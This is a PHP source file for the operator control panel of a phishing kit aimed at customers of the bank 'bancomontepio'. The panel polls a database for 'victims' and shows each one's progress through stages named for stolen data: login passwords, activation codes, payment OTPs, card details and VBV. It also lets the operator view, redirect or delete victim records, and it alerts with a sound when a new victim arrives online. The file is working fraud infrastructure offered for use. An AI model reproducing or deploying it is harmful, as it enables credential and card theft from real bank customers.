<?php
session_start();
require './database_setup/connection.php';
require 'php_functions/php_functions.php';
require './panel_setup/config.php';

if ($panel_password != $_POST["password"] && $_SESSION["loggedIn"] != true) {
  header("Location: index.php");
} else {
  $_SESSION["loggedIn"] = true;
}

$site_lists = ['bancomontepio', 'site 1', 'site 2'];

$sel_site = 'bancomontepio';

$vic_rows = [];

$onlineUser = 0;
$offlineUser = 0;

$userNum = 0;
$total_status_on_load = 0;

$ip_entries = mysqli_query($conn, 'SELECT * FROM connect_history WHERE site_name="bancomontepio"');
$ips = [];
if ($ip_entries) {
  while ($row = mysqli_fetch_array($ip_entries)) {
    $ips[] = $row;
  }
}

?>

<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="utf-8">
  <title>Control Panel</title>

  <!-- Mobile Viewport -->
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- jQuery -->
  <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>

  <link rel="stylesheet" href="js/growl-notification/dark-theme.min.css">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">

  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>

  <!-- FontAwesome -->
  <script src="https://kit.fontawesome.com/08df1faba4.js" crossorigin="anonymous"></script>

  <!-- CSS -->
  <link rel="stylesheet" href="css/main.css">

  <script>
    var sound_enabled = <?php echo file_get_contents('settings/sound_settings.txt') ?>;
  </script>
</head>

<body>
  <style>
    .success1 {
      background: blue !important;
    }
  </style>
  <div id="dark-nav-bar">
    <div class="container natural-middle">
      <p class="natural-left" id="nav-bar-title">Control Panel</p>
      <div class="middle" style="display: inline-block;">
        <span><i class="fas fa-bell" id="notification"></i></span>
        <span style="margin-left: 10px; margin-right: 10px"></span>
        <!-- <span><i class="fas fa-trash-alt" id="delete-db"></i></span> -->
        <span id='siteName' class="siteName" style="color: lightgray; margin-left: 20px; margin-right: 10px; font-weight: 700;"><?php echo $sel_site; ?></span>
        <span id="visitors" class="visitors" style="color: lightgray; margin-left: 10px;" onclick="">Visitors: <b><?= count($ips) ?></b></span>
      </div>
      <p class="natural-right" id="log-out" onclick="
        <?php
        $_SESSION['loggedIn'] = false;
        ?>
        window.location.href='index.php';
      ">log out</p>
    </div>
    <script>
      if (sound_enabled == '0') {
        $('#notification').removeClass("fa-bell").addClass("fa-bell-slash");
      } else {
        $('#notification').removeClass("fa-bell-slash").addClass("fa-bell");
      }
    </script>
  </div>
  <div class="surface">
    <br>
    <div class="container">
      <div class="row">
        <div class="col-lg-3 col-5">
          <div class="table">
            <div class="row">
              <div class="col-12">
                <?php if (count($site_lists) != 0) { ?>
                  <div class="table-row top-row">
                    <div class="row">
                      <div class="col-3">
                        <span class="table-header">Status</span><br>
                      </div>
                      <div class="col-9">
                        <span class="table-header">Name</span>
                      </div>
                    </div>
                  </div>
                <?php } else { ?>
                  <div class="table-row" style="text-align: center; padding: 0; height: 50px;">
                    <p style="color: lightgray; line-height: 50px; vertical-align: middle;">There are no exist site!</p>
                  </div>
                <?php } ?>
              </div>
            </div>

            <div class="row">
              <div class="col-12">
                <?php $counter = 0; ?>
                <?php $beeped = false; ?>
                <?php foreach ($site_lists as $site) { ?>
                  <?php $counter += 1; ?>
                  <div class="table-row <?php if ($counter % 2 != 0) echo 'alternate-row'; ?>">
                    <div class="row">
                      <div class="col-3">
                        <span class="online-alert">Online</span>
                      </div>
                      <div class="col-6">
                        <span class="table-cell-text"><?php echo $site; ?></span>
                      </div>
                      <div class="col-3">
                        <button class="action-btn" onclick="getSiteInfo('<?php echo $site; ?>')">Show</button>
                      </div>
                    </div>
                  </div>
                <?php } ?>
              </div>
            </div>
          </div>
        </div>
        <div class="col-lg-3 col-7">
          <div class="row">
            <div class="col-12">
              <div class="surface-widget">
                <p class="widget-title">Total Victims</p>
                <i class="fas fa-credit-card widget-icon"></i>
                <span class="widget-data" id="userNum"><?= $userNum ?></span>
                <div id="container"></div>
              </div>
            </div>
          </div>
          <br>
          <div class="row">
            <div class="col-12">
              <div class="surface-widget">
                <p class="widget-title">Online Victims</p>
                <i class="fas fa-signal widget-icon"></i>
                <span class="widget-data" id="online-v"><?= $onlineUser ?></span>
              </div>
            </div>
          </div>
          <br>
          <div class="row">
            <div class="col-12">
              <div class="surface-widget">
                <p class="widget-title">Offline Victims</p>
                <i class="far fa-check-circle widget-icon"></i>
                <span class="widget-data" id="offline-v"><?= $offlineUser ?></span>
              </div>
            </div>
          </div>
        </div>

        <div class="col-lg-6 col-12">
          <div class="table" id="user_list"></div>
        </div>
      </div>
    </div>
  </div>

  <!-- tippy.js -->
  <!-- Development -->
  <script src="https://unpkg.com/@popperjs/core@2/dist/umd/popper.min.js"></script>
  <script src="https://unpkg.com/tippy.js@6/dist/tippy-bundle.umd.js"></script>
  <script src="js/growl-notification/growl-notification.min.js"></script>
  <script src="js/notifications.js"></script>
  <script src="js/main.js"></script>
  <script>
    let selSite = '<?php echo $sel_site; ?>';

    function getSiteInfo(siteName) {
      selSite = siteName;
      $('#siteName').text(selSite);
    }

    function remove_row(_uniqueid) {
      $.ajax({
        type: 'POST',
        url: '../database_setup/routes/delete_db.php?single',
        data: {
          uniqueid: _uniqueid
        },
        success: function(data) {
          let parsed_data = JSON.parse(data);
          if (parsed_data.status == 'success') {
            setTimeout(function() {
              window.location.reload();
            }, 500)
          }
        }
      })
    }

    function actionBtn(uId) {
      window.open('action-view.php?id=' + uId + '&selSite=' + selSite, '_blank')
    }

    $(document).ready(() => {
      let nIntervId;
      let load_status = <?php echo $total_status_on_load ?>;
      let onlineUser = <?php echo $onlineUser; ?>;
      let offlineUser = <?php echo $offlineUser; ?>;
      let userNum = <?php echo $userNum; ?>;

      function status_match($status) {
        switch (Number($status)) {
          case 0:
            return 'Loading';
            break;
          case 1:
            return 'First 3 Password';
            break;
          case 2:
            return 'Device Confirmation';
            break;
          case 3:
            return 'Activation Code';
            break;
          case 4:
            return 'Payment Request';
            break;
          case 5:
            return 'Payment OTP';
            break;
          case 6:
            return 'Finished';
            break;
          case 8:
            return 'Finished (Mobile)';
            break;
          case 9:
            return 'Card Details';
            break;
          case 10:
            return 'VBV';
            break;
          case 11:
            return 'Last 3 Password';
            break;

            // Error Status'
          case 7:
            return 'Resent Login';
            break;
          case 12:
            return 'Resent OTP';
            break;
          case 13:
            return 'Resent Device Conf';
            break;
          case 14:
            return 'Resent Activation Code';
            break;
        }
      }

      function compare_time($time) {
        return <?php echo time(); ?> - $time;
      }

      function getUserStatus() {
        $.ajax({
          type: 'GET',
          url: 'php_polling/get_total_user_status.php?siteName=' + selSite,
          success: function(data) {
            let parsed_data = JSON.parse(data);

            $('#visitors').html('Visitors: <b>' + parsed_data.visitors + '</b>');

            if (onlineUser != parsed_data.onlineUser) {
              onlineUser = parsed_data.onlineUser;
              $('#online-v').text(onlineUser);
            }
            if (offlineUser != parsed_data.offlineUser) {
              offlineUser = parsed_data.offlineUser;
              $('#offline-v').text(offlineUser);
            }

            if ((userNum != parsed_data.userNum) || (load_status != parsed_data.totalStatus) || (parsed_data.userNum == 0)) {
              let counter = 0;
              let beeped = false;
              load_status = parsed_data.totalStatus;

              //header
              let content = '<div class="row">';
              content += '<div class="col-12">';
              if (parsed_data.userNum != 0) {
                content += '<div class="table-row top-row">';
                content += '<div class="row">';
                content += '<div class="col-2">';
                content += '<span class="table-header">Status</span><br>';
                content += '</div>';
                content += '<div class="col-3">';
                content += '<span class="table-header">Current Page</span>';
                content += '</div>';
                content += '<div class="col-3">';
                content += '<span class="table-header">User</span>';
                content += '</div>';
                content += '<div class="col-3">';
                content += '<span class="table-header">Actions</span>';
                content += '</div>';
                content += '</div>';
                content += '</div>';
              } else {
                content += '<div class="table-row" style="text-align: center; padding: 0; height: 50px;">';
                content += '<p style="color: lightgray; line-height: 50px; vertical-align: middle;">There are no entries yet!</p>';
                content += '</div>';
              }
              content += '</div></div>';

              //body
              content += '<div class="row">';
              content += '<div class="col-12">';

              parsed_data.vicRows.forEach(row => {
                if (row["viewed"] == 'false' && beeped == false && compare_time(row["last_activity"]) < 5000) {
                  if (sound_enabled == '1') {
                    var audio = new Audio('sounds/notify.mp3');
                    audio.play();
                  }
                  beeped = true;
                }
                counter++;

                content += '<div class="table-row ' + ((counter % 2 != 0) ? 'alternate-row' : '') + '">';
                content += '<div class="row ' + ((row["viewed"] == 'false' && compare_time(row["last_activity"]) < 5000) ? 'flashit' : '') + '">';
                content += '<div class="col-2">';
                content += (compare_time(row["last_activity"]) < 5000) ? '<span class="online-alert">Online</span>' : '<span class="offline-alert">Offline</span>';
                content += '</div>';
                content += '<div class="col-3">';
                content += '<span class="table-cell-text">' + status_match(row['status']) + '</span>';
                content += '</div>';
                content += '<div class="col-3">';
                content += '<span class="table-cell-text">' + row["username"] + '</span>';
                content += '</div>';
                content += '<div class="col-2">';
                content += '<button class="action-btn" onclick="actionBtn(' + row['id'] + ')">Settings</button>';
                content += '</div>';
                content += '<div class="col-2">';
                content += '<button class="action-btn" style="background: red;" onclick="remove_row(' + row['id'] + ')"><i class="fas fa-trash-alt"></i></button>';
                content += '</div></div></div>';
              });

              content += '</div></div>';

              $('#user_list').html(content);
            }

            if (userNum != parsed_data.userNum) {
              userNum = parsed_data.userNum;
              $('#userNum').text(userNum);
            }
          }
        })
      };

      if (!nIntervId) {
        nIntervId = setInterval(function() {
          getUserStatus();
        }, 5000);
      }

      getUserStatus();
    });
  </script>
</body>

</html>